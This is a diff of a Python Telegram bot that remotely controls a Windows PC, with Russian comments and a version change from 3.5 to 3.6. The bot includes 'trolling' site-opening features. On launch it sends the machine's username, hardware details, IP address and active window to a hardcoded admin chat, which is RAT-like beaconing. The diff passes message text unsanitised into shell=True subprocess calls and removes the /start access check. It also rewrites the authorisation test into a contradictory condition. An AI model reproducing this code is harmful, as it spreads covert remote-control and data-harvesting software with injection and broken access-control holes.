@@ -18,13 +18,13 @@ FAST_KEYS = ["enter", "backspace", "space", "tab", "ctrl+a", "ctrl+z", "ctrl+c",
 FAST_CMDS = ['tasklist', 'ping']  # Быстрые команды (используются при вводе команд)
 TROLL_WEBSITES = ['https://dzen.ru', 'https://youtube.com', 'https://www.google.com', 'https://yandex.ru', 'https://vk.com']  # Сайты для открытия в троллинге (используются при троллинге массовым открытием сайтов)
 
-VERSION = '3.5'  # Версия бота
-TOKEN = "12354567:FJUIFHDhfuihUIHFAUI"  # Токен бота
-FIRST_ID = 123123123  # ID главного админа (обязтаельно к заполнению)
+VERSION = '3.6'  # Версия бота
+TOKEN = ""  # Токен бота
+FIRST_ID = 1215122907  # ID главного админа (обязтаельно к заполнению)
 SECOND_ID = 0  # ID второго админа (необязательно к заполнению). Оставьте 0, если в нем нет необходимости
 
-SAMP_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска SAMP
-RAKLITE_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска RakSamp Lite
+SAMP_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска SAMP. Используйте двойной слэш (\\) вместо одинарного
+RAKLITE_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска RakSamp Lite. Используйте двойной слэш (\\) вместо одинарного
 
 bot = TeleBot(TOKEN, parse_mode=None)  #Токен
 pyautogui.FAILSAFE = False
@@ -39,7 +39,7 @@ def make_temp_folder():
 
 
 def is_access_denied(id: int):
-    return id == FIRST_ID or id == SECOND_ID
+    return not (id != FIRST_ID or id != SECOND_ID)
 
 
 #//////////////////////////////////////////////////////////
@@ -58,13 +58,12 @@ oper = uname()
 try: virtual_memory = psutil.virtual_memory()
 except: virtual_memory = 'нет информации'
 
-try: battery = psutil.sensors_battery()[0]
+try: battery = str(psutil.sensors_battery()[0]) + '%'
 except: battery = 'нет информации'
 
 
 @bot.message_handler(commands=['start'])
 def start(message: types.Message):
-    if is_access_denied(message.chat.id): return None
     return mainmenu(message)
 
 def mainmenu(message: types.Message):
@@ -733,7 +732,7 @@ def samp_connect(message: types.Message):
     try:
         bot.send_message(message.chat.id, f'☑️ Подключаемся к серверу с IP *{ message.text.strip()}*...', parse_mode = "Markdown")
         samp_menu(message)
-        return subprocess.Popen(f'{SAMP_ROUTE}\samp.exe {message.text.strip()}', shell=True)
+        return subprocess.Popen(f'{SAMP_ROUTE}\\samp.exe {message.text.strip()}', shell=True)
         
     except: bot.send_message(message.chat.id, '❌ Произошла ошибка! Проверьте ваш settings.ini', parse_mode = "Markdown")
     return samp_menu(message)
@@ -752,7 +751,7 @@ def raklite_connect(message: types.Message):
     bot.send_message(message.chat.id, f'☑️ Подключаемся к *{info[1]}:{info[2]}*', parse_mode = "Markdown")
     samp_menu(message)
 
-    try: return subprocess.Popen(f'"{RAKLITE_ROUTE}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z', shell=True)
+    try: return subprocess.Popen(f'"{RAKLITE_ROUTE}\\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z', shell=True)
     except:
         bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
         return samp_menu(message)
@@ -996,12 +995,12 @@ def pc_settings_check(message: types.Message):
             
         try: virtual_memory = psutil.virtual_memory()
         except: virtual_memory = 'нет информации'
-        try: battery = psutil.sensors_battery()[0]
+        try: battery = str(psutil.sensors_battery()[0]) + '%'
         except: battery = 'нет информации'
         active_window = getActiveWindowTitle()
 
         if active_window == None or active_window == '': active_window = 'Рабочий стол'
-        bot.send_message(FIRST_ID, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{startup_time}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n😻 Оперативная память: *Доступно {int(virtual_memory[0] / 1e+9)} ГБ | Загружено {virtual_memory[2]}%*\n🔋 Батарея заряжена на *{battery}%*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f'\n🔑 IP адрес запустившего - *{str(ip)[2:-1]}*\n*🖼 Активное окно - {active_window}*', parse_mode="Markdown")
+        bot.send_message(FIRST_ID, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{startup_time}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n😻 Оперативная память: *Доступно {int(virtual_memory[0] / 1e+9)} ГБ | Загружено {virtual_memory[2]}%*\n🔋 Батарея заряжена на *{battery}*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f'\n🔑 IP адрес запустившего - *{str(ip)[2:-1]}*\n*🖼 Активное окно - {active_window}*', parse_mode="Markdown")
         return pc_settings(message)
 
     bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
@@ -1234,7 +1233,7 @@ def bind_read(message: types.Message):
 
 if __name__ == '__main__':
     startup_time = datetime.now()
-    message = bot.send_message(FIRST_ID, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{startup_time}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n😻 Оперативная память: *Доступно {int(virtual_memory[0] / 1e+9)} ГБ | Загружено {virtual_memory[2]}%*\n🔋 Батарея заряжена на *{battery}%*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f'\n🔑 IP адрес запустившего - *{str(ip)[2:-1]}*', parse_mode="Markdown")
+    message = bot.send_message(FIRST_ID, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{startup_time}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n😻 Оперативная память: *Доступно {int(virtual_memory[0] / 1e+9)} ГБ | Загружено {virtual_memory[2]}%*\n🔋 Батарея заряжена на *{battery}*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f'\n🔑 IP адрес запустившего - *{str(ip)[2:-1]}*', parse_mode="Markdown")
     mainmenu(message)
     print(f"{startup_time} | Управление компьютером v.{VERSION} успешно запущено!")
     bot.infinity_polling(none_stop = True)
